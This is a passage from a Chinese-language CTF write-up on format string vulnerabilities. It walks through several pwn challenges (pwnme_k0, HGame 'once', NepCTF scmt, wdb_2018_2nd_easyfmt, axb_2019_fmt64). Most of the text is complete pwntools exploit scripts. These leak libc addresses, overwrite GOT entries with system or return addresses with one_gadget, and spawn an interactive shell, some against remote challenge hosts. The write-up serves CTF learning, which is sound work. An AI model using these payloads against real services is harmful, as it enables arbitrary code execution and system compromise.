class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;puts_got: system_addr&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please enter the name of the file you want to upload:&#x27;</span>,<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;then, enter the content:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;enter the file name you want to get:&#x27;</span>,<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="hijiack-retaddr"><a href="#hijiack-retaddr" class="headerlink" title="hijiack retaddr"></a>hijiack retaddr</h2><p>利用格式化字符串劫持返回地址到我们想要执行的地址</p>
<h3 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme_k0"></a>三个白帽 - pwnme_k0</h3><p>保护</p>
<p><img src="/article/Format%20String/image-20210402155026123.png" alt="image-20210402155026123"></p>
<p>64位的程序，开启了NX保护和RELRO保护，没有办法修改程序的got表了。</p>
<p>IDA</p>
<p><img src="/article/Format%20String/image-20210402155158540.png" alt="image-20210402155158540"></p>
<p>格式化字符串漏洞点在注册完成之后查看功能里面</p>
<p><img src="/article/Format%20String/image-20210402155325101.png" alt="image-20210402155325101"></p>
<p>用shift+f12查看字符串，发现有system(“/bin/sh”)</p>
<p>利用思路：</p>
<ul>
<li></li>
</ul>
<p>断点在printf处调试，b *0x400B39</p>
<p><img src="/article/Format%20String/image-20210402160140172.png" alt="image-20210402160140172"></p>
<p>0x7fffffffdd68，也就是第7个格式化字符串参数的位置存放的是这个函数的返回地址（不是printf），而这个地址是会改变的，但可以通过 rbp 与 ret 的偏移来计算，也就是：0x7fffffffdda0 - 0x7fffffffdd68 = 0x38。继而如果我们知道了 rbp 的数值，就知道了函数返回地址的地址。<br>用上面的实验图片来说，先用%6$p作为密码，使其泄露出 rbp 的地址 0x7fffffffdda0，所以 rbp - 0x38 = ret_addr </p>
<p>再我们想要ret_addr 0x400d74 变成getshell 0x4008a6 的地址，他们只有低 2 字节不同，所以可以指修改 0x7fffffffdd68 开始的 2 个字节。</p>
<p>一种方法是通过 username 来保存 ret_addr，username 和 password 之间的距离为 20 个字节。</p>
<p><img src="/article/Format%20String/image-20210403174303056.png" alt="image-20210403174303056"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwnme&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400B39&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your username(max lenth:20): &#x27;</span>,<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your password(max lenth:20): &#x27;</span>,<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">rbp_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;rbp=&#x27;</span>,<span class="built_in">hex</span>(rbp_addr)</span><br><span class="line"></span><br><span class="line">ret_addr = (rbp_addr - <span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%2218d%8$hn&#x27;</span> </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input new username(max lenth:20):&#x27;</span>,p64(ret_addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input new password(max lenth:20):&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二种方式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwnme&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400B39&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your username(max lenth:20): &#x27;</span>,<span class="string">&#x27;1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your password(max lenth:20): &#x27;</span>,<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rbp_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;rbp=&#x27;</span>,<span class="built_in">hex</span>(rbp_addr)</span><br><span class="line"></span><br><span class="line">ret_addr = (rbp_addr - <span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%2214u%12$hn&#x27;</span> + p64(ret_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input new username(max lenth:20):&#x27;</span>,<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;please input new password(max lenth:20):&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>













<h1 id="比赛真题"><a href="#比赛真题" class="headerlink" title="比赛真题"></a>比赛真题</h1><h2 id="HGame-week1"><a href="#HGame-week1" class="headerlink" title="HGame week1"></a>HGame week1</h2><h3 id="once"><a href="#once" class="headerlink" title="once"></a>once</h3><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191440.png" alt="20210306191440"></p>
<p>IDA看，明显是格式化字符串漏洞，显然是⽤来 leak （泄露地址） 的了，泄露出 libc 的地址，就能计算出 onegadget 的地址了，最后覆盖返回地址，使得返回到 onegadget 就能拿到 shell</p>
<p>但是这不能⼀次就完成，要分两步，第⼀次利⽤要先 leak，覆盖返回地址，返回到漏洞开始的地⽅（这里就是程序的 vuln 函数），第⼆次就覆盖返回地址成 onegadget 即可</p>
<p>在第⼀步呢，有⼀个关键点，地址随机化的最低 12 bit，是不会变的，所以只要覆盖最低的 1 个字节，就可以返回到其它相近的地⽅，⽐如 vuln 函数的开头，</p>
<p>我用[tag]的方法找字符串的偏移老找不准：</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191649.png" alt="20210306191649"></p>
<p>如果想要找到栈中一些函数的地址来计算偏移的时候，不知道break在printf处后，栈中第一个值到底是第几个参数，所以我用了IDA去找。</p>
<p>test_exp:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;AAAA&#x27;</span>  + <span class="string">&#x27;%1$p&#x27;</span> +<span class="string">&#x27;%2$p&#x27;</span> +  <span class="string">&#x27;%3$p&#x27;</span> +<span class="string">&#x27;%4$p&#x27;</span> +  <span class="string">&#x27;%5$p&#x27;</span>    + <span class="string">&#x27;%6$p&#x27;</span>  + <span class="string">&#x27;%13$p&#x27;</span>  + <span class="string">&#x27;%14$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;It is your turn: &#x27;</span>,payload)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140046.png" alt="20210307140046"></p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140246.png" alt="20210307140246"></p>
<p>可以看到第13个参数是一个 libc_start_main 的地址，利用这个地址与题目给的 libc 文件就可以计算出 onegadget </p>
<p>最后的 getshell 中 +0x4f3d5 用 one_gadget [libcname] 指令</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210308133927.png" alt="20210308133927"></p>
<p>exp：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">30107</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./once&#x27;)</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">binary = ELF(<span class="string">&#x27;./once&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">payload = <span class="string">&#x27;%13$p\n&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload +=   <span class="string">&#x27;\xD3&#x27;</span> </span><br><span class="line">p.sendafter(<span class="string">&#x27;It is your turn: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;True&#x27;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(libc_addr,<span class="number">16</span>)</span><br><span class="line">libc_base = libc_addr  - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">0xe7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">getshell = <span class="string">&#x27;a&#x27;</span> *<span class="number">0x28</span></span><br><span class="line">getshell += p64(libc_base + <span class="number">0x4f3d5</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;It is your turn: &#x27;</span>)</span><br><span class="line">p.sendline(getshell)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>




<h2 id="NepCTF-（未解决）"><a href="#NepCTF-（未解决）" class="headerlink" title="NepCTF （未解决）"></a>NepCTF （未解决）</h2><h3 id="scmt"><a href="#scmt" class="headerlink" title="scmt"></a>scmt</h3><p>2021.3.25</p>
<p>找不到点</p>
<p>官方writeup</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p= process(<span class="string">&quot;./scmt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&quot;node2.hackingfor.fun&quot;,39232)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%*8$p%7$n&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tell me your name:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27; number:&#x27;</span>,<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="wdb-2018-2nd-easyfmt"><a href="#wdb-2018-2nd-easyfmt" class="headerlink" title="wdb_2018_2nd_easyfmt"></a>wdb_2018_2nd_easyfmt</h1><p><img src="/article/Format%20String/image-20211025184408548.png" alt="image-20211025184408548"></p>
<p>格式化字符串漏洞</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul>
<li>找格式化字符偏移量</li>
<li>利用格式化字符串打印 got 表地址，计算出 libc</li>
<li>将 printf@got 改为 system</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="offset"><a href="#offset" class="headerlink" title="offset"></a>offset</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">aaaa%p</span><br></pre></td></tr></table></figure>

<p>offset = 6</p>
<p><img src="/article/Format%20String/image-20211025184851532.png" alt="image-20211025184851532"></p>
<h3 id="leak-printf-got"><a href="#leak-printf-got" class="headerlink" title="leak printf@got"></a>leak printf@got</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(printf_got) + <span class="string">&#x27;%6$s&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="修改-printf-got"><a href="#修改-printf-got" class="headerlink" title="修改 printf@got"></a>修改 printf@got</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;amd64&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28214</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">23946</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Do you know repeater?&quot;</span>)</span><br><span class="line">payload = p32(printf_got) + <span class="string">&#x27;%6$s&#x27;</span></span><br><span class="line"><span class="comment"># payload = &#x27;aaaa%p.%p.%p.%p.%p.%p.%p.%p.&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">log.success(<span class="string">&#x27;printf_addr: &#x27;</span>+<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr: &#x27;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x080485CA&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="axb-2019-fmt64"><a href="#axb-2019-fmt64" class="headerlink" title="* axb_2019_fmt64 *"></a>* axb_2019_fmt64 *</h1><h2 id="64位程序格式化字符串漏洞"><a href="#64位程序格式化字符串漏洞" class="headerlink" title="64位程序格式化字符串漏洞"></a>64位程序格式化字符串漏洞</h2><p>保护</p>
<p><img src="/article/Format%20String/image-20211028185829217.png" alt="image-20211028185829217"></p>
<p>IDA</p>
<p><img src="/article/Format%20String/image-20211028185925816.png" alt="image-20211028185925816"></p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="计算格式化字符偏移"><a href="#计算格式化字符偏移" class="headerlink" title="计算格式化字符偏移"></a>计算格式化字符偏移</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;aaaaaaaa%p.%p.%p.%p.%p.%p.%p.%p.&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/Format%20String/image-20211028190350906.png" alt="image-20211028190350906"></p>
<p>偏移为 8</p>
<h3 id="泄露-got-表"><a href="#泄露-got-表" class="headerlink" title="泄露 got 表"></a>泄露 got 表</h3><p>此处构造64位程序的payload需要注意：</p>
<ul>
<li>8字节的对齐</li>
<li>printf 遇到 <code>\x00</code> 时会截断，认为字符串已经结束。所以构造的时候地址要放在格式化字符的后面，放在前面会被截断</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%9$saaaa&#x27;</span> + p64(printf_got) </span><br></pre></td></tr></table></figure>

<p>PS：</p>
<ul>
<li>加上 <code>aaaa</code> 是为了凑够 8字节。len(‘%8$saaaa’) = 8</li>
<li>上面计算偏移为 8，但在这里用了9。在我理解中，<code>%8</code> 泄漏的是 <code>&#39;%9$saaaa&#39;</code> 这个字符串，它的下一个9（8+1）才是 <code>p64(printf_got) </code></li>
</ul>
<h3 id="计算-libc-base、system-地址"><a href="#计算-libc-base、system-地址" class="headerlink" title="计算 libc_base、system 地址"></a>计算 libc_base、system 地址</h3><p><img src="/article/Format%20String/image-20211028194534061.png" alt="image-20211028194534061"></p>
<p>这里试过修改 printf@got 指向 system，但是失败了，具体原因没有找到；改用 strlen 后成功 getshell</p>
<p>在后面打远程的时候，一开始泄漏 printf@got 程序运行不了了，也不太像延迟绑定机制，挺无语的。改为泄漏 puts@got 就成功了</p>
<h3 id="几种不同的修改字节方式"><a href="#几种不同的修改字节方式" class="headerlink" title="几种不同的修改字节方式"></a>几种不同的修改字节方式</h3><p><img src="/article/Format%20String/image-20211028194819294.png" alt="image-20211028194819294"></p>
<p>如果只是仅仅写入一个字节。最后一个对应 <code>printf_got</code>，倒数第二个对应 <code>printf_got+1</code>，倒数第二个对应 <code>printf_got+2</code>。如果写入的不止一个字节，则还需要计算前面已经有多少个字符数量。</p>
<p>我们知道：</p>
<blockquote>
<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置</p>
<p>真实地址是从最后一位开始泄漏的，所以我们第一个修改的字节也就是真实地址的最后一位</p>
</blockquote>
<ul>
<li>%n：写入 4 字节</li>
<li>%hn：写入 2 字节</li>
<li>%hnn：写入 1 字节</li>
</ul>
<h4 id="hnn-逐一写入字节"><a href="#hnn-逐一写入字节" class="headerlink" title="%hnn 逐一写入字节"></a>%hnn 逐一写入字节</h4><h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h5><p>让这个地址的后三位是按从大到小的顺序排列，因为我们的%n是目标地址中的值修改为其前面打印出的字符数量，所以如果地址的后三位不是按我们要求的递增来的，那么我们用%c来修改值的话就不好计算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system = <span class="built_in">hex</span>(system_addr)[<span class="number">8</span>:]	<span class="comment">#get last 3 byte</span></span><br><span class="line">a = system[:<span class="number">2</span>]</span><br><span class="line">b = system[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">c = system[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a&lt;b <span class="keyword">or</span> b&lt;c:</span><br><span class="line">    execfile(<span class="string">&#x27;test.py&#x27;</span>)</span><br><span class="line">    quit()</span><br></pre></td></tr></table></figure>

<h5 id="payload-构造（简写）"><a href="#payload-构造（简写）" class="headerlink" title="payload 构造（简写）"></a>payload 构造（简写）</h5><ol>
<li><p>先修改最后一个字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c-<span class="number">9</span>) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%[i]$hhn&#x27;</span></span><br></pre></td></tr></table></figure>

<p>c-9 是因为 printf 还会输出 <code>Repeater</code>，长度为9，所以减去</p>
<p>i 可以到后面在计算</p>
</li>
<li><p>修改中间字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(b-c) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%[i+1]$hhn&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>修改第三个字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(a-b) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%[i+2]$hhn&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>对齐</p>
<p>前面说到要8字节对齐，这个 payload 一共有 33 个字符，补到 8 的倍数即 40</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = payload.ljust(<span class="number">40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>接上目的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload += p64(strlen_got) + p64(strlen_got+<span class="number">1</span>) + p64(strlen_got+<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>这时我们就可以填补上第1点中的变量 i。最后一个字节对应 <code>p64(strlen_got)</code>，前面计算出格式化字符偏移是8，每过一个字节即偏移加一，在<code>p64(strlen_got)</code>之前一共有40个字符，即偏移 = 8+5 = 13。也可以 send 一次确定偏移</p>
<p><img src="/article/Format%20String/image-20211028210044094.png" alt="image-20211028210044094"></p>
</li>
</ol>
<p>补全的 payload 如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(c,<span class="number">16</span>)-<span class="number">9</span>) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%13$hhn&#x27;</span> </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(b,<span class="number">16</span>)-<span class="built_in">int</span>(c,<span class="number">16</span>)) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%14$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(a,<span class="number">16</span>)-<span class="built_in">int</span>(b,<span class="number">16</span>)) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%15$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(strlen_got) + p64(strlen_got+<span class="number">1</span>) + p64(strlen_got+<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">filename = <span class="string">&#x27;axb_2019_fmt64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(filename)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25756</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = elf.libc</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&quot;strlen&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%9$saaaa&#x27;</span> + p64(puts_got) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">log.success(<span class="string">&#x27;system_addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = <span class="built_in">hex</span>(system_addr)[<span class="number">8</span>:]</span><br><span class="line">a = system[:<span class="number">2</span>]</span><br><span class="line">b = system[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">c = system[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;system: &#x27;</span> + system)</span><br><span class="line">log.success(<span class="string">&#x27;a: &#x27;</span> + a)</span><br><span class="line">log.success(<span 